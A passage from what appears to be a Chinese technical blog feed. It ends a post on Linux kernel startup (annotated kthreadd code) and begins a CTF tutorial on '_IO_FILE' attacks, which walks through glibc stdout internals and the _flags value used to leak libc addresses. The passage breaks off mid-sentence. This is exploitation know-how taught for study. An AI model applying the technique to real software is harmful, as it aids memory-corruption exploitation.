class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kthreadd</span><span class="params">(<span class="keyword">void</span> *unused)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span> =</span> current;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Setup a clean context for our children to inherit. */</span></span><br><span class="line">set_task_comm(tsk, <span class="string">&quot;kthreadd&quot;</span>);</span><br><span class="line">ignore_signals(tsk);</span><br><span class="line">set_cpus_allowed_ptr(tsk, cpu_all_mask);<span class="comment">//运行kthreadd在任意CPU运行</span></span><br><span class="line">set_mems_allowed(node_states[N_MEMORY]);</span><br><span class="line"> </span><br><span class="line">current-&gt;flags |= PF_NOFREEZE;</span><br><span class="line">cgroup_init_kthreadd();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//设置当前进程状态为TASK_INTERRUPTIBLE，</span></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">        <span class="comment">//查找kthread_create_list列表中 是否有新需创建的线程，如果没有让出CPU，进入睡眠</span></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;kthread_create_list))</span><br><span class="line">schedule();</span><br><span class="line">        <span class="comment">//如果有要创建的线程，设置当前进程状态为TASK_INTERRUPTIBLE 运行态</span></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line">        <span class="comment">//spin_lock自旋锁，不可睡眠</span></span><br><span class="line">spin_lock(&amp;kthread_create_lock);</span><br><span class="line">        <span class="comment">//查找kthread_create_list列表</span></span><br><span class="line"><span class="keyword">while</span> (!list_empty(&amp;kthread_create_list)) &#123;</span><br><span class="line">            <span class="comment">//kthread_info</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kthread_create_info</span> *<span class="title">create</span>;</span></span><br><span class="line">            <span class="comment">//从kthread_create_list中取出要创建线程的信息</span></span><br><span class="line">create = list_entry(kthread_create_list.next,</span><br><span class="line">    struct kthread_create_info, <span class="built_in">list</span>);</span><br><span class="line">            <span class="comment">//从列表中删除要创建的线程</span></span><br><span class="line">list_del_init(&amp;create-&gt;<span class="built_in">list</span>);</span><br><span class="line">            <span class="comment">//spin_unlock 解锁</span></span><br><span class="line">spin_unlock(&amp;kthread_create_lock);</span><br><span class="line">            <span class="comment">//创建线程</span></span><br><span class="line">create_kthread(create);</span><br><span class="line">            <span class="comment">//spin_lock自旋锁，不可睡眠   </span></span><br><span class="line">spin_lock(&amp;kthread_create_lock);</span><br><span class="line">&#125;</span><br><span class="line">         <span class="comment">//spin_unlock 解锁</span></span><br><span class="line">spin_unlock(&amp;kthread_create_lock);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>自此回看之前的问题，再总结一下：</p><ul><li><code>idle</code>进程是什么，它是怎么来的，它的作用是什么？</li></ul><p><code>idle</code>进程其实就是<code>start_kernel</code>最开始创建的进程—-<code>init_task</code>，通过<code>cpu_idle()</code>函数将<code>init_task</code>转化成<code>idle</code>进程，其实就是0号进程在不同时间段中不同的状态</p><ul><li>0号进程是什么？1号呢？2号呢？1号进程和2号进程的作用又是什么呢？</li></ul><p>0号进程为<code>init_task/idle</code>，1号进程为<code>init</code>进程，2号进程为<code>kthreadd</code>，更详细的介绍可以看看下面的系列：</p><p><a href="https://blog.csdn.net/mahang123456/article/details/88722948?spm=1001.2014.3001.5501">Android 8.0 开机流程 (一) Linux内核启动过程</a></p><p><a href="https://blog.csdn.net/mahang123456/article/details/88732420?spm=1001.2014.3001.5501">Android 8.0 开机流程 (二) Linux 内核kthreadd进程的启动</a></p><p><a href="https://blog.csdn.net/mahang123456/article/details/88741650?spm=1001.2014.3001.5501">Android 8.0 开机流程 (三) Linux 内核 init 进程的启动</a></p><ul><li>内核启动完成以后处于一个什么状态当中？</li></ul><p>处于一个死循环当中，保证操作系统能正常的运行</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cxyzjd.com/article/zhongyhc/8842478">linux启动流程（从start_kernel中的rest_init函数到init进程（1）</a></p><p><a href="https://blog.csdn.net/lushoumin/article/details/85330185">linux内核rest_init分析</a></p><p><a href="https://blog.csdn.net/notbaron/article/details/80033417">start_kernel启动函数——简版</a></p><p>[Linux 3.2.8 内核启动过程](</p>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>_IO_FILE攻击</title>
      <link href="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/"/>
      <url>/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>_IO_FILE</code>攻击从<code>exp</code>中来看很简单，但其背后的含有并不简单，可以用复杂来形容，也很模板化，在比赛中有几种比较常见的形式，除了<code>House of orange</code>，还有用它来泄露<code>libc</code>地址（此文章重点讲解），接下来一起来看看，动手调一调，给自己留个深刻的印象</p></blockquote><h4 id="IO-FILE到底是个啥？"><a href="#IO-FILE到底是个啥？" class="headerlink" title="_IO_FILE到底是个啥？"></a>_IO_FILE到底是个啥？</h4><p>在一开始接触这个东西的时候，真的是一头雾水，各种结构体，晕头转向，其实IO_FILE的本质就是三个基本的文件流，<code>stdin、stdout、stderr</code>，这三个东西我们应该很常见，标准输入，标准输出，标准错误，在程序初始化的时候就已经默认生成好了，所以在通常情况下，我们再打开一个文件流的<code>fd</code>为<code>3</code>，那么这些文件流是通过什么来索引的呢？答：<code>IO_list_all</code>会通过单项列表保存所有的文件流：</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/1.png" class=""><p><code>_IO_FILE</code>的源码在<code>/usr/include/x86_64-linux-gnu/bits/libio.h</code>或者<code>libio/libio.h</code>，可以去看看，里面有各种各样的IO函数，但我们只关注<code>_IO_FILE</code>相关的函数，下面是<code>_IO_FILE</code>的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  ...<span class="comment">//下面为一些宏</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>_IO_FILE</code>下面可以看到它的老爸<code>_IO_FILE_plus</code>，但并没有它的函数定义，定义在<code>libio/libioP.h</code>里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">//虚函数表</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE file</code>就是刚刚的那个结构体，<code>_IO_jump_t</code>如下，此虚表在<code>House of orange</code>用的比较多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE file</code>大体就这样，可以考察下面的链接再加深一下：</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc</a></p><p><a href="https://la13x.github.io/2021/07/27/IO-FILE/#fopen">IO_FILE相关利用</a></p><p><a href="http://blog.ivan0.com/2018/11/19/IO_FILE/">IO_FILE</a></p><p>接下来就是利用<code>_IO_FILE</code>泄露<code>libc</code>的原理</p><h4 id="如何用-IO-FILE泄露libc"><a href="#如何用-IO-FILE泄露libc" class="headerlink" title="如何用_IO_FILE泄露libc"></a>如何用_IO_FILE泄露libc</h4><blockquote><p>泄露的本质只是利用它原来的输出，只是可以任意地址写了之后改写了一些参数，让它本来的输出呈现出不一样的结果罢了！</p></blockquote><p>下面就用<code>puts</code>函数来讲解，如何构造一些巧妙的值来达到泄露<code>libc</code>目的，<code>puts</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用这么多函数最终是调用了<code>vtable</code>中的<code> JUMP_FIELD(_IO_xsputn_t, __xsputn);</code>，动态的结果也是这样（好像动调的前面都有个<code>_file</code>）：</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/2.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接下来就是<code>_IO_OVERFLOW</code>，进到<code>_IO_OVERFLOW</code>就是泄露的重点了！</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/3.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的最终的目的就是通过<code>_IO_do_write</code>来泄露<code>libc</code>，那要到达这个分支，需要绕过如下判断：</p><ol><li><code> if (f-&gt;_flags &amp; _IO_NO_WRITES)</code></li><li><code> if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</code></li></ol><p>上面两个分支都是避免进入的，我们只要进入<code>if (ch == EOF)</code>这个判断里面，查找一些宏定义之后就可以算出<code>flag</code>的值了，以后只要用这个<code>flag</code>的值就能进入 <code>_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</code>这个分支了：</p><blockquote><p><code>_flags = 0xfbad0000 </code><br><code>_flags &amp;= ~_IO_NO_WRITES  ==&gt; _flags = 0xfbad0000 </code><br><code>_flags |= _IO_CURRENTLY_PUTTING ==&gt; _flags = 0xfbad0800</code></p></blockquote><p>既然能正常进入<code>_IO_do_write</code>，我们进去看看，发现有个<code>if &#123;&#125; else if&#123;&#125;</code>，这会绕不过了，只能看看进到那个分支里面对结果影响小，其实不用说，一看<code>fp-&gt;_offset = _IO_pos_BAD;</code>的影响就小，毕竟就一条语句，下面那个分支就很危险了，这里引用其他大佬的一段话：</p><blockquote><p>这条分支我们尽可能的不碰，原因有两点：</p><p>第一，其实只要满足判断中的条件<code>fp-&gt;_IO_read_end = 